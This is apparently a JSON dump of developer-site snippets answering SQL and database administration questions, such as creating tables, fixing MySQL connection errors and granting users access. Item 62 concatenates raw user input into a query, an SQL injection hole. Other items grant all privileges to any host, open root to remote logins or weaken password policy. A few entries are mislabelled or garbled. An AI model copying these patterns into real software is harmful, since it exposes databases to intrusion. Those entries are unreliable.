    "reg_date": "2021-10-12T09:53:38.000Z"
  },
  {
    "id": 57,
    "keyword": null,
    "link": null,
    "title": " Create a SQL Server Database programmatically",
    "description": " String str;  SqlConnection myConn = new SqlConnection (\"Server=localhost;Integrated security=SSPI;database=master\");  str = \"CREATE DATABASE MyDatabase ON PRIMARY \" +  \"(NAME = MyDatabase_Data, \" +  \"FILENAME = 'C:\\\\MyDatabaseData.mdf', \" +  \"SIZE = 2MB, MAXSIZE = 10MB, FILEGROWTH = 10%)\" +  \"LOG ON (NAME = MyDatabase_Log, \" +  \"FILENAME = 'C:\\\\MyDatabaseLog.ldf', \" +  \"SIZE = 1MB, \" +  \"MAXSIZE = 5MB, \" +  \"FILEGROWTH = 10%)\";  SqlCommand myCommand = new SqlCommand(str, myConn); try {     myConn.Open();     myCommand.ExecuteNonQuery();     MessageBox.Show(\"DataBase is Created Successfully\", \"MyProgram\", MessageBoxButtons.OK, MessageBoxIcon.Information); } catch (System.Exception ex) {     MessageBox.Show(ex.ToString(), \"MyProgram\", MessageBoxButtons.OK, MessageBoxIcon.Information); } finally {     if (myConn.State == ConnectionState.Open)     {         myConn.Close();     } } \nString str;  SqlConnection myConn = new SqlConnection (\"Server=localhost;Integrated security=SSPI;database=master\");  str = \"CREATE DATABASE MyDatabase ON PRIMARY \" +  \"(NAME = MyDatabase_Data, \" +  \"FILENAME = 'C:\\\\MyDatabaseData.mdf', \" +  \"SIZE = 2MB, MAXSIZE = 10MB, FILEGROWTH = 10%)\" +  \"LOG ON (NAME = MyDatabase_Log, \" +  \"FILENAME = 'C:\\\\MyDatabaseLog.ldf', \" +  \"SIZE = 1MB, \" +  \"MAXSIZE = 5MB, \" +  \"FILEGROWTH = 10%)\";  SqlCommand myCommand = new SqlCommand(str, myConn); try {\n",
    "reg_date": "2021-10-12T09:53:38.000Z"
  },
  {
    "id": 58,
    "keyword": null,
    "link": null,
    "title": " Create new table in SQL from old table with data",
    "description": "Select * into new_table  from  old_table  \n",
    "reg_date": "2021-10-12T09:53:39.000Z"
  },
  {
    "id": 59,
    "keyword": null,
    "link": null,
    "title": " Create table from another table",
    "description": " CREATE TABLE new_table_name AS     SELECT *     FROM existing_table_name     WHERE 0 \nSQL> CREATE TABLE SALARY AS    SELECT ID, SALARY    FROM CUSTOMERS;\nSELECT * INTO newtable FROM oldtable WHERE 1 = 0;\n",
    "reg_date": "2021-10-12T09:53:39.000Z"
  },
  {
    "id": 60,
    "keyword": null,
    "link": null,
    "title": " DATEDIFF minute postgres",
    "description": "  -- Difference between Dec 30, 2011 08:54:55 and  Dec 30, 2011 08:56:10 in minutes   SELECT (DATE_PART('day', '2011-12-30 08:56:10'::timestamp - '2011-12-30 08:54:55'::timestamp) * 24 * 60 +                 DATE_PART('hour', '2011-12-30 08:56:10'::timestamp - '2011-12-30 08:54:55'::timestamp)) * 60 +                DATE_PART('minute', '2011-12-30 08:56:10'::timestamp - '2011-12-30 08:54:55'::timestamp);   -- Result: 1     -- Time only   SELECT DATE_PART('hour', '08:56:10'::time - '08:54:55'::time) * 60 +               DATE_PART('minute', '08:56:10'::time - '08:54:55'::time);   -- Result: 1\n   CREATE OR REPLACE FUNCTION DateDiff (units VARCHAR(30), start_t TIME, end_t TIME)       RETURNS INT AS $$    DECLARE      diff_interval INTERVAL;       diff INT = 0;    BEGIN      -- Minus operator for TIME returns interval 'HH:MI:SS'        diff_interval = end_t - start_t;        diff = DATE_PART('hour', diff_interval);        IF units IN ('hh', 'hour') THEN        RETURN diff;      END IF;        diff = diff * 60 + DATE_PART('minute', diff_interval);        IF units IN ('mi', 'n', 'minute') THEN         RETURN diff;      END IF;        diff = diff * 60 + DATE_PART('second', diff_interval);        RETURN diff;    END;    $$ LANGUAGE plpgsql;\n",
    "reg_date": "2021-10-12T09:53:39.000Z"
  },
  {
    "id": 61,
    "keyword": null,
    "link": null,
    "title": " DATE SUB postgres",
    "description": "-- MySQL DATE_SUB(NOW(), INTERVAL '1 YEAR') -- PostgreSQL (NOW() - INTERVAL '1 YEAR')\n",
    "reg_date": "2021-10-12T09:53:39.000Z"
  },
  {
    "id": 62,
    "keyword": null,
    "link": null,
    "title": " DB::table('users')->get();",
    "description": "$users = DB::table('users')->get(); \nDB::select('SELECT * FROM users WHERE name = ?', array(Input::get('name'))); \n$product = DB::table('product')->get(['id','product_name']);\nDB::select('SELECT * FROM users WHERE name = \"'.Input::get('name').'\"'); \nDB::table('users')->where('name', Input::get('name'))->get(); \nDB::select('select * from users '); \n",
    "reg_date": "2021-10-12T09:53:39.000Z"
  },
  {
    "id": 63,
    "keyword": null,
    "link": null,
    "title": " DB::transaction",
    "description": "use Illuminate\\Support\\Facades\\DB;  DB::transaction(function () {     DB::update('update users set votes = 1');      DB::delete('delete from posts'); });\nDB::beginTransaction();  try {     DB::insert(...);     DB::insert(...);     DB::insert(...);      DB::commit();     // all good } catch (\\Exception $e) {     DB::rollback();     // something went wrong } \n",
    "reg_date": "2021-10-12T09:53:39.000Z"
  },
  {
    "id": 64,
    "keyword": null,
    "link": null,
    "title": " DB: in eloquent using sql",
    "description": "$results = DB::select('select * from users where id = :id', ['id' => 1]);\n",
    "reg_date": "2021-10-12T09:53:39.000Z"
  },
  {
    "id": 65,
    "keyword": null,
    "link": null,
    "title": " DBA HIST SQLTEXT",
    "description": "SELECT * FROM DBA_HIST_SQLTEXT WHERE upper(SQL_TEXT) LIKE 'INSERT INTO MY_TABLE%';\n",
    "reg_date": "2021-10-12T09:53:39.000Z"
  },
  {
    "id": 66,
    "keyword": null,
    "link": null,
    "title": " DBMS OUTPUT.PUT LINE",
    "description": "-- SQL Developer :  show View | DBMS Output > Add connection (+) SET SERVEROUTPUT ON; DECLARE \tv_name VARCHAR2(50) := 'Bond'; BEGIN \tDBMS_OUTPUT.PUT_LINE('Hello !'); \tDBMS_OUTPUT.PUT_LINE('My name is ' || v_name); END;\ndbms_output.put_line(\"YOUR MESSAGE\"); \nset serveroutput on  DBMS_OUTPUT.PUT_LINE(v_variable || '-' || v_variable2);\n-- EXAMPLE SET SERVEROUTPUT ON; BEGIN DBMS_OUTPUT.PUT_LINE('This is printed. '||'This is concatenated and printed too!'); END; /\n",
    "reg_date": "2021-10-12T09:53:39.000Z"
  },
  {
    "id": 67,
    "keyword": null,
    "link": null,
    "title": " DISTINCT SQL",
    "description": "SELECT DISTINCT column1, column2, ...   FROM table_name; \nSELECT DISTINCT ma_colonne FROM nom_du_tableau\nSELECT DISTINCT column1, column1, ..... FROM TABLE /*DISTINCT WILL NOT SELECT THE SAME VALUES IN SAME COLUMN*/\nDistinct: helps to displays the non duplicate records when retrieving the records from a table.  SELECT DISTINCT FIRST_NAME FROM VISITORS;\nSELECT DISTINCT FIRST_NAME FROM VISITORS;\nSELECT DISTINCT Column_name FROM table_name;\n",
    "reg_date": "2021-10-12T09:53:39.000Z"
  },
  {
    "id": 68,
    "keyword": null,
    "link": null,
    "title": " Define REGEXP?",
    "description": "REGEXP is a pattern match in which matches pattern anywhere in the search value.\n",
    "reg_date": "2021-10-12T09:53:39.000Z"
  },
  {
    "id": 69,
    "keyword": null,
    "link": null,
    "title": " Delete all data in neo4j",
    "description": "MATCH (n) DETACH DELETE n;\n",
    "reg_date": "2021-10-12T09:53:40.000Z"
  },
  {
    "id": 70,
    "keyword": null,
    "link": null,
    "title": " Deleting database in sql",
    "description": "DELETE FROM contacts WHERE id = 1; \n",
    "reg_date": "2021-10-12T09:53:40.000Z"
  },
  {
    "id": 71,
    "keyword": null,
    "link": null,
    "title": " Don't know how to set rpath on your system, if MySQL libraries are not in path mysql2 may not load",
    "description": "export LIBRARY_PATH=$LIBRARY_PATH:/usr/local/opt/openssl/lib/ \nbrew install openssl \n",
    "reg_date": "2021-10-12T09:53:40.000Z"
  },
  {
    "id": 72,
    "keyword": null,
    "link": null,
    "title": " Duplicating a MySQL table with all the data Command",
    "description": "CREATE TABLE `new_table` (id INT(11) auto_increment primary key) SELECT old_table.name, old_table.group, old_table.floor, old_table.age from old_table;\n",
    "reg_date": "2021-10-12T09:53:40.000Z"
  },
  {
    "id": 73,
    "keyword": null,
    "link": null,
    "title": " ERROR: Failed to open file 'C:\\Users\\PuspakASharma\\TEST.SQL', error: 2",
    "description": "In short, you got the path wrong.\n",
    "reg_date": "2021-10-12T09:53:40.000Z"
  },
  {
    "id": 74,
    "keyword": null,
    "link": null,
    "title": " ERROR 1045 (28000): Access denied for user 'labanino'@'localhost' (using password: NO)",
    "description": "",
    "reg_date": "2021-10-12T09:53:40.000Z"
  },
  {
    "id": 75,
    "keyword": null,
    "link": null,
    "title": " ERROR 1045 (28000): Access denied for user 'root'@'localhost' (using password: NO)",
    "description": "sudo mysql  ALTER USER 'root'@'localhost' IDENTIFIED WITH mysql_native_password BY 'root'; \nmysql -u root -p \n",
    "reg_date": "2021-10-12T09:53:40.000Z"
  },
  {
    "id": 76,
    "keyword": null,
    "link": null,
    "title": " ERROR 1290 (HY000): The MySQL server is running with the --secure-file-priv option so it cannot execute this statement",
    "description": "# Check the default location of secure_file_priv SHOW VARIABLES LIKE \"secure_file_priv\";  # Save the file in that location Select ... From ... INTO OUTFILE ...\nLOAD DATA LOCAL INFILE ...\n",
    "reg_date": "2021-10-12T09:53:40.000Z"
  },
  {
    "id": 77,
    "keyword": null,
    "link": null,
    "title": " ERROR 1396 (HY000): Operation DROP USER failed for 'ananyapam'@'%'",
    "description": "select user,host from mysql.user where user = '<your-user>';\n",
    "reg_date": "2021-10-12T09:53:40.000Z"
  },
  {
    "id": 78,
    "keyword": null,
    "link": null,
    "title": " ERROR 1819 (HY000): Your password does not satisfy the current policy requirements",
    "description": "mysql> SET GLOBAL validate_password.policy = 0;\nmysql> SET GLOBAL validate_password.policy=LOW;\nmysql> SHOW VARIABLES LIKE 'validate_password%';\n+--------------------------------------+--------+ | Variable_name                        | Value  | +--------------------------------------+--------+ | validate_password.check_user_name    | ON     | | validate_password.dictionary_file    |        | | validate_password.length             | 8      | | validate_password.mixed_case_count   | 1      | | validate_password.number_count       | 1      | | validate_password.policy             | MEDIUM | | validate_password.special_char_count | 1      | +--------------------------------------+--------+ 7 rows in set (0.09 sec)\n",
    "reg_date": "2021-10-12T09:53:40.000Z"
  },
  {
    "id": 79,
    "keyword": null,
    "link": null,
    "title": " ERROR 2002 (HY000): Can't connect to local MySQL server through socket '/tmp/mysql.sock' (2)",
    "description": "sudo chown -R _mysql:mysql /usr/local/var/mysql  sudo mysql.server start\nTry to start the MySQL server: mysql.server start\n# Remove mysql sudo apt-get remove --purge mysql\\*  #update repositories sudo apt update  # Reinstall it sudo apt install mysql-server mysql-client  # Test if it runs sudo mysql  # You can install also thes pachages. Optionnaly sudo apt install php  #mesabo youbeyou\nFor mac: The mysql server is not running.  brew services mysql start\n$ mysql.server start\nsudo chown -R _mysql:mysql /usr/local/var/mysql  sudo mysql.server start \n",
    "reg_date": "2021-10-12T09:53:40.000Z"
  },
  {
    "id": 80,
    "keyword": null,
    "link": null,
    "title": " ERROR 2002 (HY000): Can't connect to local MySQL server through socket '/var/run/mysqld/mysql.sock' (2) Ask",
    "description": "##\tERROR 2002 (HY000):  ##\tCan't connect to local MySQL server through socket   #### Follow below steps and you good to go... #### sudo dpkg-reconfigure mysql-server-{version_number} ##version_number should be mysql version number installed ## Now try login in mysql shell sudo mysql -u root -p \n",
    "reg_date": "2021-10-12T09:53:41.000Z"
  },
  {
    "id": 81,
    "keyword": null,
    "link": null,
    "title": " ERROR 2002 (HY000): Can't connect to local MySQL server through socket '/var/run/mysqld/mysqld.s",
    "description": "> ln -s /var/lib/mysql/mysql.sock /tmp/mysql.sock >  > service mysql start or service mysql start\n",
    "reg_date": "2021-10-12T09:53:41.000Z"
  },
  {
    "id": 82,
    "keyword": null,
    "link": null,
    "title": " ERROR 2002 (HY000): Can't connect to local MySQL server through socket '/var/run/mysqld/mysqld.sock' (2)",
    "description": "sudo chown -R _mysql:mysql /usr/local/var/mysql  sudo mysql.server start\n# Remove mysql sudo apt-get remove --purge mysql\\*  #update repositories sudo apt update  # Reinstall it sudo apt install mysql-server mysql-client  # Test if it runs sudo mysql  # You can install also thes pachages. Optionnaly sudo apt install php  #mesabo youbeyou\n> ln -s /var/lib/mysql/mysql.sock /tmp/mysql.sock >  > service mysql start or service mysql start\n# this saved my ass # first  you must perform a graceful shutdown of the server from the command line rather than powering off the server shutdown -h now  # an additional method for getting it back up again when you run into this problem is to move mysql.sock  # to centos mv /var/lib/mysql/mysql.sock /var/lib/mysql/mysql.sock.bak  # to ubuntu mv /var/run/mysqld/mysqld.sock /var/run/mysqld/mysqld.sock.bak  # restart mysql service mysqld start\nsudo apt-get install mysql-server \nmysql -h 127.0.0.1 -P 3306 -u root -p <database>\n",
    "reg_date": "2021-10-12T09:53:41.000Z"
  },
  {
    "id": 83,
    "keyword": null,
    "link": null,
    "title": " ERROR 2002 (HY000): Can't connect to local MySQL server through socket '/var/run/mysqld/mysqld.sock' (2) ubuntu",
    "description": "sudo chown -R _mysql:mysql /usr/local/var/mysql  sudo mysql.server start\n# Start your mysql server /etc/init.d/mysql start\n# Remove mysql sudo apt-get remove --purge mysql\\*  #update repositories sudo apt update  # Reinstall it sudo apt install mysql-server mysql-client  # Test if it runs sudo mysql  # You can install also thes pachages. Optionnaly sudo apt install php  #mesabo youbeyou\n> ln -s /var/lib/mysql/mysql.sock /tmp/mysql.sock >  > service mysql start or service mysql start\n# If you're usinng wsl sudo /etc/init.d/mysql start #else sudo apt-get remove --purge mysql* sudo apt-get autoremove sudo apt-get autoclean sudo apt-get install mysql-server mysql-client\nsudo apt-get remove --purge mysql* sudo apt-get autoremove sudo apt-get autoclean sudo apt-get install mysql-server mysql-client \n",
    "reg_date": "2021-10-12T09:53:41.000Z"
  },
  {
    "id": 84,
    "keyword": null,
    "link": null,
    "title": " ERROR 2006 (HY000) at line 64: MySQL server has gone away",
    "description": "SET GLOBAL max_allowed_packet=1073741824;\n",
    "reg_date": "2021-10-12T09:53:41.000Z"
  },
  {
    "id": 85,
    "keyword": null,
    "link": null,
    "title": " ER NOT SUPPORTED AUTH MODE: Client does not support authentication protocol requested by server; consider upgrading MySQL client",
    "description": "$ mysql -u root -p Enter password: (enter your root password)  mysql> ALTER USER 'root'@'localhost' IDENTIFIED WITH mysql_native_password BY 'your_new_password'; mysql> FLUSH PRIVILEGES; mysql> quit\nnpm install mysql2 \n#SQLTools - VSCode err: ER_NOT_SUPPORTED_AUTH_MODE: Client does not support authentication protocol requested by server; consider upgrading MariaDB client  sudo mysql -u root MariaDB [(none)]> update mysql.user set password=password('<yourpassword>') where user='root'; MariaDB [(none)]> flush privileges;  -------------------------------------------------------------  sudo mysql -u root -p   Enter password: ******* select user,host,password,plugin from mysql.user;  output:   +------+-----------+------------------------+-------------+   | user | host      | password               | plugin      |   +------+-----------+------------------------+-------------+   | root | localhost | *****************      | unix_socket |   | root | e320      | *****************      | unix_socket |   | root | 127.0.0.1 | *****************      | unix_socket |   | root | ::1       | *****************      | unix_socket |   +------+-----------+------------------------+-------------+    -------------------------------------------------------------  sudo mysql -u root -p   Enter password: ******* update mysql.user set plugin='' where user='root'; flush privileges; \nA possible workaround is to alter the type of user account to use the old authentication plugin:  ALTER USER 'root'@'localhost' IDENTIFIED WITH mysql_native_password BY 'MyNewPass';  Or create a different one that uses that same plugin:  CREATE USER 'foo'@'localhost' IDENTIFIED WITH mysql_native_password BY 'bar';\nconst mysql = require(\"mysql2\") \nimport mysql from \"mysql2\"; \n",
    "reg_date": "2021-10-12T09:53:41.000Z"
  },
  {
    "id": 86,
    "keyword": null,
    "link": null,
    "title": " ER NOT SUPPORTED AUTH MODE: Client does not support authentication protocol requested by server; consider upgrading MySQL client vs code",
    "description": "npm install mysql2 \nA possible workaround is to alter the type of user account to use the old authentication plugin:  ALTER USER 'root'@'localhost' IDENTIFIED WITH mysql_native_password BY 'MyNewPass';  Or create a different one that uses that same plugin:  CREATE USER 'foo'@'localhost' IDENTIFIED WITH mysql_native_password BY 'bar';\nconst mysql = require(\"mysql2\") \nimport mysql from \"mysql2\"; \n",
    "reg_date": "2021-10-12T09:53:41.000Z"
  },
  {
    "id": 87,
    "keyword": null,
    "link": null,
    "title": " EXTRACT MONTH",
    "description": "   SELECT EXTRACT(MONTH FROM \"2017-06-15\"); \n",
    "reg_date": "2021-10-12T09:53:41.000Z"
  },
  {
    "id": 88,
    "keyword": null,
    "link": null,
    "title": " Enable Rabbitmq management plugin",
    "description": "rabbitmq-plugins enable rabbitmq_management \n",
    "reg_date": "2021-10-12T09:53:41.000Z"
  },
  {
    "id": 89,
    "keyword": null,
    "link": null,
    "title": " Enum in SQL Server",
    "description": "USE WorldofWarcraft;  CREATE TABLE [users] (    ID INT NOT NULL IDENTITY(1,1) PRIMARY KEY,    username nvarchar(255),    password nvarchar(255),    mail nvarchar (255),    [rank]  nvarchar (255) NOT NULL CHECK ([rank] IN('Fresh meat', 'Intern','Janitor','Lieutenant','Supreme being')) DEFAULT 'Fresh meat' );  \nCopied CREATE TABLE shirts (     name VARCHAR(40),     size ENUM('x-small', 'small', 'medium', 'large', 'x-large') ); INSERT INTO shirts (name, size) VALUES ('dress shirt','large'), ('t-shirt','medium'),   ('polo shirt','small'); SELECT name, size FROM shirts WHERE size = 'medium'; +---------+--------+ | name    | size   | +---------+--------+ | t-shirt | medium | +---------+--------+ UPDATE shirts SET size = 'small' WHERE size = 'large'; COMMIT;\n",
    "reg_date": "2021-10-12T09:53:41.000Z"
  },
  {
    "id": 90,
    "keyword": null,
    "link": null,
    "title": " Error:Got a packet bigger than 'max allowed packet' bytes",
    "description": "run this command in your mysql console.  set global net_buffer_length=1000000;  set global max_allowed_packet=1000000000; \nYou probably have to change it for both the client (you are running to do the  import) AND the daemon mysqld that is running and accepting the import.  For the client, you can specify it on the command line: \tmysql --max_allowed_packet=100M -u root -p database < dump.sql  Also, change the my.cnf or my.ini file under the mysqld section and set: \tmax_allowed_packet=100M  or you could run these commands in a MySQL console connected to that same  server: \tset global net_buffer_length=1000000;  \tset global max_allowed_packet=1000000000;  (Use a very large value for the packet size.)\n",
    "reg_date": "2021-10-12T09:53:42.000Z"
  },
  {
    "id": 91,
    "keyword": null,
    "link": null,
    "title": " Error Code: 1175. You are using safe update mode and you tried to update a table without a WHERE that uses a KEY column. To disable safe mode, toggle the option in Preferences -> SQL Editor and reconnect.",
    "description": "SET SQL_SAFE_UPDATES = 0;\nUPDATE tablename SET columnname=1;\n",
    "reg_date": "2021-10-12T09:53:42.000Z"
  },
  {
    "id": 92,
    "keyword": null,
    "link": null,
    "title": " Error loading MySQLdb module.",
    "description": "sudo apt-get install libmysqlclient-dev sudo apt-get install libssl-dev pip install mysqlclient  #for Debian su apt install libmysqlclient-dev su apt install libssl-dev pip install mysqlclient\npip3 install http://cdn.mysql.com/Downloads/Connector-Python/mysql-connector-python-2.0.4.zip\n",
    "reg_date": "2021-10-12T09:53:42.000Z"
  },
  {
    "id": 93,
    "keyword": null,
    "link": null,
    "title": " Expression number 1 of select list is not in group by clause",
    "description": "mysql> set global sql_mode='STRICT_TRANS_TABLES,NO_ZERO_IN_DATE,NO_ZERO_DATE,ERROR_FOR_DIVISION_BY_ZERO,NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION';  mysql> set session sql_mode='STRICT_TRANS_TABLES,NO_ZERO_IN_DATE,NO_ZERO_DATE,ERROR_FOR_DIVISION_BY_ZERO,NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION';\n",
    "reg_date": "2021-10-12T09:53:42.000Z"
  },
  {
    "id": 94,
    "keyword": null,
    "link": null,
    "title": " FIND ABOVE AVERAGE SALARY EARNER IN SQL",
    "description": "SELECT FIRST_NAME, LAST_NAME FROM EMPLOYEES WHERE SALARY > (SELECT AVG(SALARY) FROM EMPLOYEES);\n",
    "reg_date": "2021-10-12T09:53:42.000Z"
  },
  {
    "id": 95,
    "keyword": null,
    "link": null,
    "title": " FIND AVERAGE SALARY EARNER IN SQL",
    "description": "SELECT FIRST_NAME FROM EMPLOYEES WHERE SALARY = (SELECT AVG(SALARY) FROM EMPLOYEES);\n",
    "reg_date": "2021-10-12T09:53:42.000Z"
  },
  {
    "id": 96,
    "keyword": null,
    "link": null,
    "title": " FIND LOWEST SALARY EARNER IN SQL",
    "description": "SELECT FIRST_NAME FROM EMPLOYEES WHERE SALARY = (SELECT MIN(SALARY) FROM EMPLOYEES);\n",
    "reg_date": "2021-10-12T09:53:42.000Z"
  },
  {
    "id": 97,
    "keyword": null,
    "link": null,
    "title": " FIND OUT THE NAME HIGHEST SALARY SQL",
    "description": "SELECT FIRST_NAME FROM EMPLOYEES WHERE SALARY = (SELECT MAX(SALARY) FROM EMPLOYEES);\n/*  Highest salary by Department/Location   */ SELECT e.ename, e.sal, e.deptno, d.loc FROM emp e JOIN dept d ON e.deptno = d.deptno WHERE e.sal in ( \t   \tselect max(sal)    \tfrom emp    \tgroup by deptno )\n",
    "reg_date": "2021-10-12T09:53:42.000Z"
  },
  {
    "id": 98,
    "keyword": null,
    "link": null,
    "title": " FIND most frequent word in sql server",
    "description": "select top 3 senderName,  COUNT(senderName) as Top3 from remitTran(nolock) where  pCountry='aaaa' and approvedDate between '2020-12-26' and '2020-12-28'   group by senderName order by count(sendername) desc\n",
    "reg_date": "2021-10-12T09:53:42.000Z"
  },
  {
    "id": 99,
    "keyword": null,
    "link": null,
    "title": " FSADeprecationWarning: SQLALCHEMY TRACK MODIFICATIONS adds significant overhead and will be disabled by default in the future.  Set it to True or False to suppress this  warning.",
    "description": "# just put this line it will solve the issue  app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False # keep helping others :) :)\n",
    "reg_date": "2021-10-12T09:53:43.000Z"
  },
  {
    "id": 100,
    "keyword": null,
    "link": null,
    "title": " Failed to connect to localhost:1433 - self signed certificate",
    "description": "const config = {   port: parseInt(process.env.DB_PORT, 10),   server: process.env.DB_HOST,   user: process.env.DB_USER,   password: process.env.DB_PASS,   database: process.env.DB_Database,   stream: false,   options: {     trustedConnection: true,     encrypt: true,     enableArithAbort: true,     trustServerCertificate: false,    }, }  sql.connect(config).then(pool => {   if (pool.connecting) {     console.log('Connecting to the database...')   }   if (pool.connected) {     console.log('Connected to SQL Server')   } }) \n",
    "reg_date": "2021-10-12T09:53:43.000Z"
  },
  {
    "id": 101,
    "keyword": null,
    "link": null,
    "title": " Failed to process SQL command - ORA-28014: cannot drop administrative user or role",
    "description": "alter session set \"_oracle_script\"=true; \n",
    "reg_date": "2021-10-12T09:53:43.000Z"
  },
  {
    "id": 102,
    "keyword": null,
    "link": null,
    "title": " Failed to stop mysqld.service: Unit mysqld.service not loaded.",
    "description": "sudo service mysql stop\n",
    "reg_date": "2021-10-12T09:53:43.000Z"
  },
  {
    "id": 103,
    "keyword": null,
    "link": null,
    "title": " Find all triggers in database",
    "description": "SELECT       name,     is_instead_of_trigger FROM      sys.triggers   WHERE      type = 'TR';\n",
    "reg_date": "2021-10-12T09:53:43.000Z"
  },
  {
    "id": 104,
    "keyword": null,
    "link": null,
    "title": " Find most frequent value in SQL column",
    "description": "SELECT       `column`,              COUNT(`column`) AS `value_occurrence`      FROM     `my_table`     GROUP BY `column`     ORDER BY `value_occurrence` DESC     LIMIT    1;\n",
    "reg_date": "2021-10-12T09:53:43.000Z"
  },
  {
    "id": 105,
    "keyword": null,
    "link": null,
    "title": " Found option without preceding group in config file: /etc/mysql/mariadb.conf.d/50-server.cnf at line: 1",
    "description": "// Just add [mysqld] as first line in the /etc/mysql/my.cnf file. // Example:  [mysqld] default-time-zone = \"+08:00\" ...\n",
    "reg_date": "2021-10-12T09:53:43.000Z"
  },
  {
    "id": 106,
    "keyword": null,
    "link": null,
    "title": " Full outer join example",
    "description": " SELECT Customers.CustomerName, Orders.OrderID  FROM Customers  FULL OUTER JOIN Orders ON Customers.CustomerID=Orders.CustomerID  ORDER BY Customers.CustomerName;  \nSELECT C.FirstName, C.LastName, C.Country AS CustomerCountry,        S.Country AS SupplierCountry, S.CompanyName  FROM Customer C FULL JOIN Supplier S     ON C.Country = S.Country ORDER BY C.Country, S.Country\n123SELECT columns  FROM table_A  FULL OUTER JOIN table_B ON join_conditionsXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX\nFULL OUTER JOIN: is used when retrieving data from multiple tables and will return both table records, matching and non-matching.\n",
    "reg_date": "2021-10-12T09:53:43.000Z"
  },
  {
    "id": 107,
    "keyword": null,
    "link": null,
    "title": " GROUP BY clause; this is incompati",
    "description": "",
    "reg_date": "2021-10-12T09:53:43.000Z"
  },
  {
    "id": 108,
    "keyword": null,
    "link": null,
    "title": " GROUP BY clause; this is incompatible with sql mode=only full group by",
    "description": "SET GLOBAL sql_mode=(SELECT REPLACE(@@sql_mode,'ONLY_FULL_GROUP_BY','')); SET SESSION sql_mode=(SELECT REPLACE(@@sql_mode,'ONLY_FULL_GROUP_BY',''));\nmysql > SET GLOBAL sql_mode=(SELECT REPLACE(@@sql_mode,'ONLY_FULL_GROUP_BY',''));\nmysql> set global sql_mode='STRICT_TRANS_TABLES,NO_ZERO_IN_DATE,NO_ZERO_DATE,ERROR_FOR_DIVISION_BY_ZERO,NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION'; mysql> set session sql_mode='STRICT_TRANS_TABLES,NO_ZERO_IN_DATE,NO_ZERO_DATE,ERROR_FOR_DIVISION_BY_ZERO,NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION';\ncheck this article for solved this issue  https://afrijaldzuhri.com/mengatasi-error-group-by-di-mysql/\n",
    "reg_date": "2021-10-12T09:53:43.000Z"
  },
  {
    "id": 109,
    "keyword": null,
    "link": null,
    "title": " GROUP BY postgres",
    "description": "SELECT     column_1,     column_2,    ...,    aggregate_function(column_3) FROM     table_name GROUP BY     column_1,    column_2,    ...; Code language: SQL (Structured Query Language) (sql)\n",
    "reg_date": "2021-10-12T09:53:44.000Z"
  },
  {
    "id": 110,
    "keyword": null,
    "link": null,
    "title": " Get first name and last name from full name string in SQL",
    "description": "DECLARE @FullName    VARCHAR(50) = 'Mark Zuckerberg'  SELECT SUBSTRING(@FullName, 1, CHARINDEX(' ', @FullName) - 1) AS [First Name],        SUBSTRING(@FullName, CHARINDEX(' ', @FullName) + 1, LEN(@FullName)) AS [Last Name] \n",
    "reg_date": "2021-10-12T09:53:44.000Z"
  },
  {
    "id": 111,
    "keyword": null,
    "link": null,
    "title": " Get the User Name and Domain Name from an Email Address",
    "description": "DECLARE @Email     VARCHAR(50) = 'helper@sql-server-helper.com'  SELECT SUBSTRING(@Email, 1, CHARINDEX('@', @Email) - 1) AS [User Name],        SUBSTRING(@Email, CHARINDEX('@', @Email) + 1, LEN(@Email)) AS [Domain Name] \n",
    "reg_date": "2021-10-12T09:53:44.000Z"
  },
  {
    "id": 112,
    "keyword": null,
    "link": null,
    "title": " Host '' is not allowed to connect to this MySQL server",
    "description": "CREATE USER 'username'@'localhost' IDENTIFIED BY 'password';  GRANT ALL PRIVILEGES ON *.* TO 'username'@'localhost' WITH GRANT OPTION;  CREATE USER 'username'@'%' IDENTIFIED BY 'password';  GRANT ALL PRIVILEGES ON *.* TO 'username'@'%' WITH GRANT OPTION;  FLUSH PRIVILEGES;\n    mysql -u root -p     -- root password      CREATE USER 'username'@'localhost' IDENTIFIED BY 'password';      GRANT ALL PRIVILEGES ON *.* TO 'username'@'localhost' WITH GRANT OPTION;      CREATE USER 'username'@'%' IDENTIFIED BY 'password';      GRANT ALL PRIVILEGES ON *.* TO 'username'@'%' WITH GRANT OPTION;      FLUSH PRIVILEGES;      EXIT;\nGRANT ALL PRIVILEGES ON *.* TO root@my_ip IDENTIFIED BY &lsquo;root_password&lsquo; WITH GRANT OPTION;\n",
    "reg_date": "2021-10-12T09:53:44.000Z"
  },
  {
    "id": 113,
    "keyword": null,
    "link": null,
    "title": " Host '192.168.43.100' is not allowed to connect to this MySQL server",
    "description": "CREATE USER 'username'@'localhost' IDENTIFIED BY 'password';  GRANT ALL PRIVILEGES ON *.* TO 'username'@'localhost' WITH GRANT OPTION;  CREATE USER 'username'@'%' IDENTIFIED BY 'password';  GRANT ALL PRIVILEGES ON *.* TO 'username'@'%' WITH GRANT OPTION;  FLUSH PRIVILEGES;\nUPDATE mysql.user SET host='%' WHERE user='root';\n",
    "reg_date": "2021-10-12T09:53:44.000Z"
  },
  {
    "id": 114,
    "keyword": null,
    "link": null,
    "title": " How To Rename Table Using MySQL RENAME TABLE Statement",
    "description": "Because business requirements change, we need to rename the current table to a new one to better reflect the new situation. MySQL provides us with a very useful statement that changes the name of one or more tables.  To change one or more tables, we use the RENAME TABLE statement as follows:  RENAME TABLE old_table_name TO new_table_name; The old table ( old_table_name) must exist, and the new table ( new_table_name) must not. If the new table new_table_name does exist, the statement will fail.  In addition to the tables, we can use the RENAME TABLE statement to rename views.\n-- mysql ALTER TABLE `members` CHANGE COLUMN `full_names` `fullname` char(250) NOT NULL;\n",
    "reg_date": "2021-10-12T09:53:44.000Z"
  },
  {
    "id": 115,
    "keyword": null,
    "link": null,
    "title": " How do I add a user to a postgres database? cli",
    "description": "# https://www.postgresql.org/docs/8.0/sql-createuser.html CREATE USER <username> WITH PASSWORD '<password>' VALID UNTIL '<date here>';\nGRANT ALL PRIVILEGES ON DATABASE yourdbname TO youruser;\npsql=# grant all privileges on database <dbname> to <username>\n",
    "reg_date": "2021-10-12T09:53:44.000Z"
  },
  {
    "id": 116,
    "keyword": null,
    "link": null,
    "title": " How do I insert a blob in SQL?",
    "description": "create table a(id integer, item blob); insert into a values(3, FILE_READ('file.dat')); \n",
